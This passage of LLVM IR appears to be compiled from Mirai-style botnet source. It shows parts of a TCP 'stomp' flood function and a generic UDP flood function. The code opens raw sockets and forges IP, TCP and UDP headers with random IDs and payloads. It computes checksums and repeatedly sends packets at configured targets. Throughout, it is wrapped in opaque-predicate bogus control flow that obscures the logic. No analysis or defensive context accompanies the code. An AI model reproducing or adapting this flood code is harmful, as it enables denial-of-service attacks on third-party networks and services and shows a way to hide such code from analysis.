originalBBpart258:                                ; preds = %originalBB56
  br i1 %685, label %694, label %830

; <label>:694:                                    ; preds = %originalBBpart258
  %695 = load i8**, i8*** %20, align 8
  %696 = load i32, i32* %17, align 4
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds i8*, i8** %695, i64 %697
  %699 = load i8*, i8** %698, align 8
  store i8* %699, i8** %47, align 8
  %700 = load i8*, i8** %47, align 8
  %701 = bitcast i8* %700 to %struct.iphdr*
  store %struct.iphdr* %701, %struct.iphdr** %48, align 8
  %702 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %703 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %702, i64 1
  %704 = bitcast %struct.iphdr* %703 to %struct.tcphdr*
  store %struct.tcphdr* %704, %struct.tcphdr** %49, align 8
  %705 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %706 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %705, i64 1
  %707 = bitcast %struct.tcphdr* %706 to i8*
  store i8* %707, i8** %50, align 8
  %708 = load i16, i16* %22, align 2
  %709 = zext i16 %708 to i32
  %710 = icmp eq i32 %709, 65535
  br i1 %710, label %711, label %733

; <label>:711:                                    ; preds = %694
  %712 = load i32, i32* @x.31
  %713 = load i32, i32* @y.32
  %714 = sub i32 %712, 1
  %715 = mul i32 %712, %714
  %716 = urem i32 %715, 2
  %717 = icmp eq i32 %716, 0
  %718 = icmp slt i32 %713, 10
  %719 = or i1 %717, %718
  br i1 %719, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %711
  %720 = call i32 @rand_next()
  %721 = and i32 %720, 65535
  %722 = trunc i32 %721 to i16
  %723 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %724 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %723, i32 0, i32 3
  store i16 %722, i16* %724, align 4
  %725 = load i32, i32* @x.31
  %726 = load i32, i32* @y.32
  %727 = sub i32 %725, 1
  %728 = mul i32 %725, %727
  %729 = urem i32 %728, 2
  %730 = icmp eq i32 %729, 0
  %731 = icmp slt i32 %726, 10
  %732 = or i1 %730, %731
  br i1 %732, label %originalBBpart263, label %originalBB60alteredBB

originalBBpart263:                                ; preds = %originalBB60
  br label %733

; <label>:733:                                    ; preds = %originalBBpart263, %694
  %734 = load i32, i32* @x.31
  %735 = load i32, i32* @y.32
  %736 = sub i32 %734, 1
  %737 = mul i32 %734, %736
  %738 = urem i32 %737, 2
  %739 = icmp eq i32 %738, 0
  %740 = icmp slt i32 %735, 10
  %741 = or i1 %739, %740
  br i1 %741, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %733
  %742 = load i8, i8* %33, align 1
  %743 = icmp ne i8 %742, 0
  %744 = load i32, i32* @x.31
  %745 = load i32, i32* @y.32
  %746 = sub i32 %744, 1
  %747 = mul i32 %744, %746
  %748 = urem i32 %747, 2
  %749 = icmp eq i32 %748, 0
  %750 = icmp slt i32 %745, 10
  %751 = or i1 %749, %750
  br i1 %751, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %743, label %752, label %755

; <label>:752:                                    ; preds = %originalBBpart267
  %753 = load i8*, i8** %50, align 8
  %754 = load i32, i32* %32, align 4
  call void @rand_str(i8* %753, i32 %754)
  br label %755

; <label>:755:                                    ; preds = %752, %originalBBpart267
  %756 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %757 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %756, i32 0, i32 7
  store i16 0, i16* %757, align 2
  %758 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %759 = bitcast %struct.iphdr* %758 to i16*
  %760 = call zeroext i16 @checksum_generic(i16* %759, i32 20)
  %761 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %762 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %761, i32 0, i32 7
  store i16 %760, i16* %762, align 2
  %763 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %764 = load i32, i32* %17, align 4
  %765 = sext i32 %764 to i64
  %766 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %763, i64 %765
  %767 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %766, i32 0, i32 1
  %768 = load i32, i32* %767, align 4
  %769 = add i32 %768, 1
  store i32 %769, i32* %767, align 4
  %770 = trunc i32 %768 to i16
  %771 = call zeroext i16 @htons(i16 zeroext %770) #7
  %772 = zext i16 %771 to i32
  %773 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %774 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %773, i32 0, i32 2
  store i32 %772, i32* %774, align 4
  %775 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %776 = load i32, i32* %17, align 4
  %777 = sext i32 %776 to i64
  %778 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %775, i64 %777
  %779 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %778, i32 0, i32 2
  %780 = load i32, i32* %779, align 4
  %781 = trunc i32 %780 to i16
  %782 = call zeroext i16 @htons(i16 zeroext %781) #7
  %783 = zext i16 %782 to i32
  %784 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %785 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %784, i32 0, i32 3
  store i32 %783, i32* %785, align 4
  %786 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %787 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %786, i32 0, i32 6
  store i16 0, i16* %787, align 4
  %788 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %789 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %790 = bitcast %struct.tcphdr* %789 to i8*
  %791 = load i32, i32* %32, align 4
  %792 = sext i32 %791 to i64
  %793 = add i64 20, %792
  %794 = trunc i64 %793 to i16
  %795 = call zeroext i16 @htons(i16 zeroext %794) #7
  %796 = load i32, i32* %32, align 4
  %797 = sext i32 %796 to i64
  %798 = add i64 20, %797
  %799 = trunc i64 %798 to i32
  %800 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %788, i8* %790, i16 zeroext %795, i32 %799)
  %801 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %802 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %801, i32 0, i32 6
  store i16 %800, i16* %802, align 4
  %803 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %804 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %803, i32 0, i32 1
  %805 = load i16, i16* %804, align 2
  %806 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %807 = load i32, i32* %17, align 4
  %808 = sext i32 %807 to i64
  %809 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %806, i64 %808
  %810 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %809, i32 0, i32 0
  %811 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %810, i32 0, i32 1
  store i16 %805, i16* %811, align 2
  %812 = load i32, i32* %18, align 4
  %813 = load i8*, i8** %47, align 8
  %814 = load i32, i32* %32, align 4
  %815 = sext i32 %814 to i64
  %816 = add i64 40, %815
  %817 = bitcast %union.__CONST_SOCKADDR_ARG* %51 to %struct.sockaddr**
  %818 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %819 = load i32, i32* %17, align 4
  %820 = sext i32 %819 to i64
  %821 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %818, i64 %820
  %822 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %821, i32 0, i32 0
  %823 = bitcast %struct.sockaddr_in* %822 to %struct.sockaddr*
  store %struct.sockaddr* %823, %struct.sockaddr** %817, align 8
  %824 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %51, i32 0, i32 0
  %825 = load %struct.sockaddr*, %struct.sockaddr** %824, align 8
  %826 = call i64 @sendto(i32 %812, i8* %813, i64 %816, i32 16384, %struct.sockaddr* %825, i32 16)
  br label %827

; <label>:827:                                    ; preds = %755
  %828 = load i32, i32* %17, align 4
  %829 = add nsw i32 %828, 1
  store i32 %829, i32* %17, align 4
  br label %673

; <label>:830:                                    ; preds = %originalBBpart258
  br label %656

; <label>:831:                                    ; preds = %282, %127, %121
  %832 = load i32, i32* @x.31
  %833 = load i32, i32* @y.32
  %834 = sub i32 %832, 1
  %835 = mul i32 %832, %834
  %836 = urem i32 %835, 2
  %837 = icmp eq i32 %836, 0
  %838 = icmp slt i32 %833, 10
  %839 = or i1 %837, %838
  br i1 %839, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %831
  %840 = load i32, i32* @x.31
  %841 = load i32, i32* @y.32
  %842 = sub i32 %840, 1
  %843 = mul i32 %840, %842
  %844 = urem i32 %843, 2
  %845 = icmp eq i32 %844, 0
  %846 = icmp slt i32 %841, 10
  %847 = or i1 %845, %846
  br i1 %847, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %848 = alloca i8, align 1
  %849 = alloca %struct.attack_target*, align 8
  %850 = alloca i8, align 1
  %851 = alloca %struct.attack_option*, align 8
  %852 = alloca i32, align 4
  %853 = alloca i32, align 4
  %854 = alloca %struct.attack_stomp_data*, align 8
  %855 = alloca i8**, align 8
  %856 = alloca i8, align 1
  %857 = alloca i16, align 2
  %858 = alloca i8, align 1
  %859 = alloca i8, align 1
  %860 = alloca i16, align 2
  %861 = alloca i8, align 1
  %862 = alloca i8, align 1
  %863 = alloca i8, align 1
  %864 = alloca i8, align 1
  %865 = alloca i8, align 1
  %866 = alloca i8, align 1
  %867 = alloca i32, align 4
  %868 = alloca i8, align 1
  %869 = alloca i32, align 4
  %870 = alloca %struct.sockaddr_in, align 4
  %871 = alloca %struct.sockaddr_in, align 4
  %872 = alloca i32, align 4
  %873 = alloca [256 x i8], align 16
  %874 = alloca i64, align 8
  %875 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %876 = alloca i32, align 4
  %877 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %878 = alloca %struct.tcphdr*, align 8
  %879 = alloca %struct.iphdr*, align 8
  %880 = alloca %struct.tcphdr*, align 8
  %881 = alloca i8*, align 8
  %882 = alloca i8*, align 8
  %883 = alloca %struct.iphdr*, align 8
  %884 = alloca %struct.tcphdr*, align 8
  %885 = alloca i8*, align 8
  %886 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %848, align 1
  store %struct.attack_target* %1, %struct.attack_target** %849, align 8
  store i8 %2, i8* %850, align 1
  store %struct.attack_option* %3, %struct.attack_option** %851, align 8
  %887 = load i8, i8* %848, align 1
  %888 = zext i8 %887 to i64
  %889 = call noalias i8* @calloc(i64 %888, i64 16) #6
  %890 = bitcast i8* %889 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %890, %struct.attack_stomp_data** %854, align 8
  %891 = load i8, i8* %848, align 1
  %892 = zext i8 %891 to i64
  %893 = call noalias i8* @calloc(i64 %892, i64 8) #6
  %894 = bitcast i8* %893 to i8**
  store i8** %894, i8*** %855, align 8
  %895 = load i8, i8* %850, align 1
  %896 = load %struct.attack_option*, %struct.attack_option** %851, align 8
  %897 = call i32 @attack_get_opt_int(i8 zeroext %895, %struct.attack_option* %896, i8 zeroext 2, i32 0)
  %898 = trunc i32 %897 to i8
  store i8 %898, i8* %856, align 1
  %899 = load i8, i8* %850, align 1
  %900 = load %struct.attack_option*, %struct.attack_option** %851, align 8
  %901 = call i32 @attack_get_opt_int(i8 zeroext %899, %struct.attack_option* %900, i8 zeroext 3, i32 65535)
  %902 = trunc i32 %901 to i16
  store i16 %902, i16* %857, align 2
  %903 = load i8, i8* %850, align 1
  %904 = load %struct.attack_option*, %struct.attack_option** %851, align 8
  %905 = call i32 @attack_get_opt_int(i8 zeroext %903, %struct.attack_option* %904, i8 zeroext 4, i32 64)
  %906 = trunc i32 %905 to i8
  store i8 %906, i8* %858, align 1
  %907 = load i8, i8* %850, align 1
  %908 = load %struct.attack_option*, %struct.attack_option** %851, align 8
  %909 = call i32 @attack_get_opt_int(i8 zeroext %907, %struct.attack_option* %908, i8 zeroext 5, i32 1)
  %910 = trunc i32 %909 to i8
  store i8 %910, i8* %859, align 1
  %911 = load i8, i8* %850, align 1
  %912 = load %struct.attack_option*, %struct.attack_option** %851, align 8
  %913 = call i32 @attack_get_opt_int(i8 zeroext %911, %struct.attack_option* %912, i8 zeroext 7, i32 65535)
  %914 = trunc i32 %913 to i16
  store i16 %914, i16* %860, align 2
  %915 = load i8, i8* %850, align 1
  %916 = load %struct.attack_option*, %struct.attack_option** %851, align 8
  %917 = call i32 @attack_get_opt_int(i8 zeroext %915, %struct.attack_option* %916, i8 zeroext 11, i32 1)
  %918 = trunc i32 %917 to i8
  store i8 %918, i8* %861, align 1
  %919 = load i8, i8* %850, align 1
  %920 = load %struct.attack_option*, %struct.attack_option** %851, align 8
  %921 = call i32 @attack_get_opt_int(i8 zeroext %919, %struct.attack_option* %920, i8 zeroext 12, i32 1)
  %922 = trunc i32 %921 to i8
  store i8 %922, i8* %862, align 1
  %923 = load i8, i8* %850, align 1
  %924 = load %struct.attack_option*, %struct.attack_option** %851, align 8
  %925 = call i32 @attack_get_opt_int(i8 zeroext %923, %struct.attack_option* %924, i8 zeroext 13, i32 1)
  %926 = trunc i32 %925 to i8
  store i8 %926, i8* %863, align 1
  %927 = load i8, i8* %850, align 1
  %928 = load %struct.attack_option*, %struct.attack_option** %851, align 8
  %929 = call i32 @attack_get_opt_int(i8 zeroext %927, %struct.attack_option* %928, i8 zeroext 14, i32 1)
  %930 = trunc i32 %929 to i8
  store i8 %930, i8* %864, align 1
  %931 = load i8, i8* %850, align 1
  %932 = load %struct.attack_option*, %struct.attack_option** %851, align 8
  %933 = call i32 @attack_get_opt_int(i8 zeroext %931, %struct.attack_option* %932, i8 zeroext 15, i32 1)
  %934 = trunc i32 %933 to i8
  store i8 %934, i8* %865, align 1
  %935 = load i8, i8* %850, align 1
  %936 = load %struct.attack_option*, %struct.attack_option** %851, align 8
  %937 = call i32 @attack_get_opt_int(i8 zeroext %935, %struct.attack_option* %936, i8 zeroext 16, i32 1)
  %938 = trunc i32 %937 to i8
  store i8 %938, i8* %866, align 1
  %939 = load i8, i8* %850, align 1
  %940 = load %struct.attack_option*, %struct.attack_option** %851, align 8
  %941 = call i32 @attack_get_opt_int(i8 zeroext %939, %struct.attack_option* %940, i8 zeroext 0, i32 768)
  store i32 %941, i32* %867, align 4
  %942 = load i8, i8* %850, align 1
  %943 = load %struct.attack_option*, %struct.attack_option** %851, align 8
  %944 = call i32 @attack_get_opt_int(i8 zeroext %942, %struct.attack_option* %943, i8 zeroext 1, i32 1)
  %945 = trunc i32 %944 to i8
  store i8 %945, i8* %868, align 1
  %946 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %946, i32* %853, align 4
  %947 = icmp eq i32 %946, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %130
  store i32 0, i32* %17, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %172
  %948 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %949 = load i32, i32* %17, align 4
  %950 = sext i32 %949 to i64
  %951 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %948, i64 %950
  %952 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %951, i32 0, i32 1
  %953 = load i32, i32* %952, align 4
  %954 = call i32 @ntohl(i32 %953) #7
  %955 = call i32 @rand_next()
  %956 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %957 = load i32, i32* %17, align 4
  %958 = sext i32 %957 to i64
  %959 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %956, i64 %958
  %960 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %959, i32 0, i32 2
  %961 = load i8, i8* %960, align 4
  %962 = zext i8 %961 to i32
  %_ = sub i32 %955, %962
  %gen = mul i32 %_, %962
  %_7 = sub i32 %955, %962
  %gen8 = mul i32 %_7, %962
  %963 = lshr i32 %955, %962
  %_9 = sub i32 0, %954
  %gen10 = add i32 %_9, %963
  %_11 = shl i32 %954, %963
  %964 = add i32 %954, %963
  %965 = call i32 @htonl(i32 %964) #7
  %966 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 2
  %967 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %966, i32 0, i32 0
  store i32 %965, i32* %967, align 4
  br label %originalBB6

originalBB15alteredBB:                            ; preds = %originalBB15, %218
  %968 = load i16, i16* %25, align 2
  %969 = zext i16 %968 to i32
  %970 = icmp eq i32 %969, 65535
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %255
  store i32 16, i32* %37, align 4
  %971 = load i32, i32* %18, align 4
  %972 = getelementptr inbounds [256 x i8], [256 x i8]* %38, i32 0, i32 0
  %973 = bitcast %union.__CONST_SOCKADDR_ARG* %42 to %struct.sockaddr**
  %974 = bitcast %struct.sockaddr_in* %36 to %struct.sockaddr*
  store %struct.sockaddr* %974, %struct.sockaddr** %973, align 8
  %975 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %42, i32 0, i32 0
  %976 = load %struct.sockaddr*, %struct.sockaddr** %975, align 8
  %977 = call i64 @recvfrom(i32 %971, i8* %972, i64 256, i32 16384, %struct.sockaddr* %976, i32* %37)
  %978 = trunc i64 %977 to i32
  store i32 %978, i32* %41, align 4
  %979 = load i32, i32* %41, align 4
  %980 = icmp eq i32 %979, -1
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %283
  %981 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %36, i32 0, i32 2
  %982 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %981, i32 0, i32 0
  %983 = load i32, i32* %982, align 4
  %984 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 2
  %985 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %984, i32 0, i32 0
  %986 = load i32, i32* %985, align 4
  %987 = icmp eq i32 %983, %986
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %307
  %988 = load i32, i32* %41, align 4
  %989 = sext i32 %988 to i64
  %990 = icmp ugt i64 %989, 40
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %446
  %991 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %992 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %993 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %992, i32 0, i32 4
  store i16 %991, i16* %993, align 2
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %608
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %636
  %994 = load i32, i32* %17, align 4
  %_40 = sub i32 0, %994
  %gen41 = add i32 %_40, 1
  %_42 = sub i32 %994, 1
  %gen43 = mul i32 %_42, 1
  %_44 = shl i32 %994, 1
  %_45 = sub i32 0, %994
  %gen46 = add i32 %_45, 1
  %_47 = sub i32 %994, 1
  %gen48 = mul i32 %_47, 1
  %995 = add nsw i32 %994, 1
  store i32 %995, i32* %17, align 4
  br label %originalBB39

originalBB52alteredBB:                            ; preds = %originalBB52, %656
  store i32 0, i32* %17, align 4
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %673
  %996 = load i32, i32* %17, align 4
  %997 = load i8, i8* %13, align 1
  %998 = zext i8 %997 to i32
  %999 = icmp slt i32 %996, %998
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %711
  %1000 = call i32 @rand_next()
  %_61 = shl i32 %1000, 65535
  %1001 = and i32 %1000, 65535
  %1002 = trunc i32 %1001 to i16
  %1003 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %1004 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1003, i32 0, i32 3
  store i16 %1002, i16* %1004, align 4
  br label %originalBB60

originalBB65alteredBB:                            ; preds = %originalBB65, %733
  %1005 = load i8, i8* %33, align 1
  %1006 = icmp ne i8 %1005, 0
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %831
  br label %originalBB69
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.33
  %6 = load i32, i32* @y.34
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i16, align 2
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %36 = load i8, i8* %13, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %19, align 8
  %40 = load i8, i8* %15, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %20, align 1
  %44 = load i8, i8* %15, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %21, align 2
  %48 = load i8, i8* %15, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %22, align 1
  %52 = load i8, i8* %15, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %23, align 1
  %56 = load i8, i8* %15, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %24, align 2
  %60 = load i8, i8* %15, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %25, align 2
  %64 = load i8, i8* %15, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %26, align 2
  %68 = load i8, i8* %15, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 1, i32 1)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %27, align 1
  %72 = load i8, i8* %15, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %28, align 4
  %76 = load i16, i16* %26, align 2
  %77 = zext i16 %76 to i32
  %78 = icmp sgt i32 %77, 1460
  %79 = load i32, i32* @x.33
  %80 = load i32, i32* @y.34
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %78, label %87, label %88

; <label>:87:                                     ; preds = %originalBBpart2
  store i16 1460, i16* %26, align 2
  br label %88

; <label>:88:                                     ; preds = %87, %originalBBpart2
  %89 = load i32, i32* @x.33
  %90 = load i32, i32* @y.34
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %88
  %97 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %97, i32* %18, align 4
  %98 = icmp eq i32 %97, -1
  %99 = load i32, i32* @x.33
  %100 = load i32, i32* @y.34
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %98, label %107, label %108

; <label>:107:                                    ; preds = %originalBBpart24
  br label %456

; <label>:108:                                    ; preds = %originalBBpart24
  store i32 1, i32* %17, align 4
  %109 = load i32, i32* %18, align 4
  %110 = bitcast i32* %17 to i8*
  %111 = call i32 @setsockopt(i32 %109, i32 0, i32 3, i8* %110, i32 4) #6
  %112 = icmp eq i32 %111, -1
  br i1 %112, label %113, label %116

; <label>:113:                                    ; preds = %108
  %114 = load i32, i32* %18, align 4
  %115 = call i32 @close(i32 %114)
  br label %456

; <label>:116:                                    ; preds = %108
  %117 = load i32, i32* @x.33
  %118 = load i32, i32* @y.34
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %116
  store i32 0, i32* %17, align 4
  %125 = load i32, i32* @x.33
  %126 = load i32, i32* @y.34
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %133

; <label>:133:                                    ; preds = %231, %originalBBpart28
  %134 = load i32, i32* @x.33
  %135 = load i32, i32* @y.34
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %133
  %142 = load i32, i32* %17, align 4
  %143 = load i8, i8* %13, align 1
  %144 = zext i8 %143 to i32
  %145 = icmp slt i32 %142, %144
  %146 = load i32, i32* @x.33
  %147 = load i32, i32* @y.34
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %145, label %154, label %234

; <label>:154:                                    ; preds = %originalBBpart212
  %155 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %156 = load i8**, i8*** %19, align 8
  %157 = load i32, i32* %17, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds i8*, i8** %156, i64 %158
  store i8* %155, i8** %159, align 8
  %160 = load i8**, i8*** %19, align 8
  %161 = load i32, i32* %17, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8*, i8** %160, i64 %162
  %164 = load i8*, i8** %163, align 8
  %165 = bitcast i8* %164 to %struct.iphdr*
  store %struct.iphdr* %165, %struct.iphdr** %29, align 8
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i64 1
  %168 = bitcast %struct.iphdr* %167 to %struct.udphdr*
  store %struct.udphdr* %168, %struct.udphdr** %30, align 8
  %169 = load %struct.iphdr*, %struct.iphdr** %29, align 8
